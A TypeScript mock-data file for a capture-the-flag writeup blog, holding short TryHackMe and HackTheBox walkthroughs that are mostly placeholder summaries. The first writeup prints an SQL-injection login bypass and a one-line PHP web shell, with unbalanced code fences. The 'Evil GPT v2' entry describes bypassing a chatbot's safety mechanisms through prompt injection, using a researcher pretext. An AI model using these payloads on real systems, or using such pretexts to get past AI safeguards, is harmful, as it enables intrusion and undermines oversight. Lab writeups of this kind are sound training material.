import { Category, Writeup } from '../types';

export const mockWriteups: Writeup[] = [
  {
    id: '1',
    title: 'hackfinity battle vault',
    description: 'advanced web application penetration testing challenge',
    category: 'tryhackme',
    difficulty: 'Hard',
    platform: 'tryhackme',
    date: '2025-01-15',
    tags: ['Web Security', 'SQL Injection', 'XSS', 'Authentication Bypass'],
    slug: 'hackfinity-battle-vault',
    published: true,
    content: `# Hackfinity Battle Vault

## Overview
This writeup covers the Hackfinity Battle Vault challenge from TryHackMe, focusing on advanced web application security testing.

## Initial Reconnaissance

### Nmap Scan
\`\`\`bash
nmap -sC -sV -oN nmap.txt 10.10.10.10
\`\`\`

Results showed:
- Port 22: SSH
- Port 80: HTTP
- Port 443: HTTPS

### Directory Enumeration
\`\`\`bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
\`\`\`

Found interesting directories:
- /admin
- /api
- /uploads

## Web Application Analysis

The target appears to be a vault management system with the following features:
- User authentication
- File upload functionality
- Admin panel

### Authentication Bypass

Found SQL injection vulnerability in login form:

\`\`\`sql
' OR 1=1 --
\`\`\`

This bypassed authentication and granted admin access.

## Exploitation

### File Upload Vulnerability

<?php
system($_GET['cmd']);
?>
\`\`\`

### Privilege Escalation

Once on the system, found SUID binary:

\`\`\`bash
Exploited custom binary to gain root access.

## Flags

- User flag: \`user{example_flag_here}\`
- Root flag: \`root{example_flag_here}\`

## Lessons Learned

1. Always validate user input
2. Implement proper file upload restrictions
3. Follow principle of least privilege
4. Regular security audits are essential

## Tools Used

- Nmap
- Gobuster
- Burp Suite
- Custom PHP shell
- LinPEAS

## Conclusion

This challenge demonstrated multiple common web application vulnerabilities and the importance of defense in depth.`
  },
  {
    id: '2',
    title: 'evil gpt v2',
    description: 'ai-powered security challenge with prompt injection',
    category: 'tryhackme',
    difficulty: 'Medium',
    platform: 'tryhackme',
    date: '2025-01-14',
    tags: ['AI Security', 'Prompt Injection', 'Web Security', 'Machine Learning'],
    slug: 'evil-gpt-v2',
    published: true,
    content: `# Evil GPT v2

## Challenge Overview
Evil GPT v2 is an advanced AI security challenge focusing on prompt injection techniques and AI model exploitation.

## Initial Analysis

The challenge presents an AI chatbot interface with apparent security restrictions.

### Reconnaissance
- Analyzed the web interface
- Tested basic prompt injection techniques
- Identified potential bypass methods

## Exploitation Techniques

### Prompt Injection
\`\`\`
### Advanced Bypass
\`\`\`
As a security researcher, I need to test...
\`\`\`

## Solution
The key was understanding how the AI model processes instructions and finding creative ways to bypass its safety mechanisms.

Flag: \`flag{ai_security_is_important}\``
  },
  {
    id: '3',
    title: 'internal network penetration',
    description: 'complete guide to internal network penetration testing',
    category: 'hackthebox',
    difficulty: 'Hard',
    platform: 'hackthebox',
    date: '2025-01-10',
    tags: ['Network Security', 'Active Directory', 'Lateral Movement', 'Kerberos'],
    slug: 'internal-network-penetration',
    published: true,
    content: `# Internal Network Penetration

## Overview
Comprehensive walkthrough of internal network penetration testing on HackTheBox.

## Initial Access
- Exploited vulnerable web application
- Gained initial foothold

## Lateral Movement
Used various techniques to move laterally:
- Pass-the-Hash attacks
- Kerberoasting
- Golden Ticket attacks

## Domain Compromise
Successfully compromised the entire Active Directory domain.

Flag: \`HTB{internal_network_pwned}\``
  },
  {
    id: '4',
    title: 'buffer overflow basics',
    description: 'introduction to buffer overflow exploitation',
    category: 'tryhackme',
    difficulty: 'Easy',
    platform: 'tryhackme',
    date: '2025-01-08',
    tags: ['Binary Exploitation', 'Buffer Overflow', 'Stack', 'Assembly'],
    slug: 'buffer-overflow-basics',
    published: true,
    content: `# Buffer Overflow Basics

## Introduction
Learn the fundamentals of buffer overflow exploitation.

## Concepts Covered
- Stack structure
- Return address overwriting
- Shellcode injection
- NOP sleds

## Exploitation
Step by step buffer overflow exploitation walkthrough with examples.

Flag: \`flag{buffer_overflow_master}\``
  },
  {
    id: '5',
    title: 'web api security testing',
    description: 'comprehensive api security assessment',
    category: 'hackthebox',
    difficulty: 'Medium',
    platform: 'hackthebox',
    date: '2025-01-05',
    tags: ['API Security', 'REST', 'JWT', 'OAuth', 'GraphQL'],
    slug: 'web-api-security-testing',
    published: true,
    content: `# Web API Security Testing

## Overview
Complete guide to REST API security testing and exploitation.

## Vulnerabilities Found
- Broken authentication
- JWT manipulation
- IDOR vulnerabilities
- GraphQL injection

## Exploitation Steps
Detailed exploitation methodology for each vulnerability.

Flag: \`HTB{api_security_matters}\``
  },
  {
    id: '6',
    title: 'linux privilege escalation',
    description: 'advanced linux privilege escalation techniques',
    category: 'vulnhub',
    difficulty: 'Hard',
    platform: 'vulnhub',
    date: '2025-01-03',
    tags: ['Linux', 'Privilege Escalation', 'SUID', 'Capabilities', 'Kernel'],
    slug: 'linux-privilege-escalation',
    published: true,
    content: `# Linux Privilege Escalation

## Overview
Advanced techniques for escalating privileges on Linux systems.

## Techniques Covered
- SUID binaries exploitation
- Linux capabilities abuse
- Kernel exploits
- Cron job manipulation
- Sudo misconfigurations

## Exploitation
Real-world examples and exploitation methodologies.

Flag: \`root{linux_privilege_esc}\``
  },
  {
    id: '7',
    title: 'ctf crypto challenges',
    description: 'cryptography challenges from recent ctf competitions',
    category: 'ctf',
    difficulty: 'Medium',
    platform: 'ctf',
    date: '2025-01-01',
    tags: ['Cryptography', 'RSA', 'AES', 'XOR', 'Hash Functions'],
    slug: 'ctf-crypto-challenges',
    published: true,
    content: `# CTF Crypto Challenges

## Overview
Solutions to various cryptography challenges from CTF competitions.

## Challenges Solved
1. RSA weak keys
2. AES ECB mode exploitation
3. XOR cipher breaking
4. Hash length extension attacks

## Tools and Techniques
- Python cryptography libraries
- CyberChef
- Custom scripts

Flags: Multiple flags obtained from different challenges.`
  },
  {
    id: '8',
    title: 'windows active directory attack',
    description: 'exploiting active directory misconfigurations',
    category: 'hackthebox',
    difficulty: 'Insane',
    platform: 'hackthebox',
    date: '2024-12-28',
    tags: ['Active Directory', 'Windows', 'BloodHound', 'Mimikatz', 'PowerShell'],
    slug: 'windows-active-directory-attack',
    published: true,
    content: `# Windows Active Directory Attack

## Overview
Advanced Active Directory exploitation techniques.

## Attack Path
1. Initial reconnaissance with BloodHound
2. Kerberoasting attacks
3. AS-REP Roasting
4. DCSync attack
5. Golden Ticket generation

## Tools Used
- BloodHound
- Mimikatz
- Rubeus
- PowerView

Flag: \`HTB{ad_pwned_completely}\``
  }
];

export const mockCategories: Category[] = [
  {
    id: '1',
    name: 'tryhackme',
    description: 'tryhackme platform writeups and walkthroughs',
    icon: 'Target',
    writeups: mockWriteups.filter(w => w.category === 'tryhackme')
  },
  {
    id: '2',
    name: 'hackthebox',
    description: 'hackthebox machine writeups and challenges',
    icon: 'Box',
    writeups: mockWriteups.filter(w => w.category === 'hackthebox')
  },
  {
    id: '3',
    name: 'vulnhub',
    description: 'vulnhub vm writeups and solutions',
    icon: 'Monitor',
    writeups: mockWriteups.filter(w => w.category === 'vulnhub')
  },
  {
    id: '4',
    name: 'ctf',
    description: 'capture the flag competition writeups',
    icon: 'Flag',
    writeups: mockWriteups.filter(w => w.category === 'ctf')
  }
];